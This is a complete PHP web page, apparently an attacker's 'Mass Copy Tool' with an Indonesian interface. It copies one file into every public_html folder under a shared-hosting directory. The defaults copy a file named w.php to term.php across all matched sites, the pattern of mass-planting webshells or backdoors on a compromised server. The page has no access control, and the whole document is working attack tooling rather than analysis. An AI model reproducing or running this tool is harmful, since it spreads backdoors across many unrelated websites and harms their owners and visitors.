<?php

$result = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $source  = trim($_POST['source'] ?? '');
    $baseDir = trim($_POST['baseDir'] ?? '');
    $pattern = trim($_POST['pattern'] ?? '/*/public_html');
    $target  = trim($_POST['target'] ?? '');

    if (!$source || !$baseDir || !$target) {

        $result[] = "Semua field wajib diisi";

    } elseif (!file_exists($source)) {

        $result[] = "Source file tidak ditemukan";

    } else {

        $success = [];
        $failed  = [];

        foreach (glob($baseDir . $pattern) as $publicHtml) {

            $targetPath = rtrim($publicHtml, '/') . '/' . $target;

            if (@copy($source, $targetPath)) {
                $success[] = $targetPath;
            } else {
                $failed[] = $targetPath;
            }
        }

        $result[] = "<h3>✅ Berhasil</h3>";

        if ($success) {
            foreach ($success as $s) {
                $result[] = $s;
            }
        } else {
            $result[] = "Tidak ada yang berhasil";
        }

        $result[] = "<h3>❌ Gagal</h3>";

        if ($failed) {
            foreach ($failed as $f) {
                $result[] = $f;
            }
        } else {
            $result[] = "Tidak ada kegagalan";
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Mass Copy Tool</title>

    <style>
        body{
            font-family: Arial;
            background:#f1f1f1;
            padding:20px;
        }

        .box{
            background:#fff;
            padding:20px;
            border-radius:10px;
            max-width:700px;
        }

        input{
            width:100%;
            padding:12px;
            margin-top:5px;
            margin-bottom:15px;
            border:1px solid #ccc;
            border-radius:5px;
        }

        button{
            background:#28a745;
            color:#fff;
            border:none;
            padding:12px 20px;
            border-radius:5px;
            cursor:pointer;
        }

        .result{
            margin-top:20px;
            background:#fafafa;
            padding:15px;
            border-radius:5px;
            border:1px solid #ddd;
            max-height:400px;
            overflow:auto;
        }
    </style>
</head>
<body>

<div class="box">

    <form method="POST">

        <label>Source File:</label>
        <input type="text" name="source"
               value="<?= htmlspecialchars($_POST['source'] ?? __DIR__.'/w.php') ?>">

        <label>Base Directory:</label>
        <input type="text" name="baseDir"
               value="<?= htmlspecialchars($_POST['baseDir'] ?? '/mnt/web521/d0/01/510377401/htdocs') ?>">

        <label>Glob Pattern:</label>
        <input type="text" name="pattern"
               value="<?= htmlspecialchars($_POST['pattern'] ?? '/*/public_html') ?>">

        <label>Nama File Target:</label>
        <input type="text" name="target"
               value="<?= htmlspecialchars($_POST['target'] ?? 'term.php') ?>">

        <button type="submit">🚀 Jalankan</button>

    </form>

    <?php if ($result): ?>
        <div class="result">
            <?= implode("<br>", $result) ?>
        </div>
    <?php endif; ?>

</div>

</body>
</html>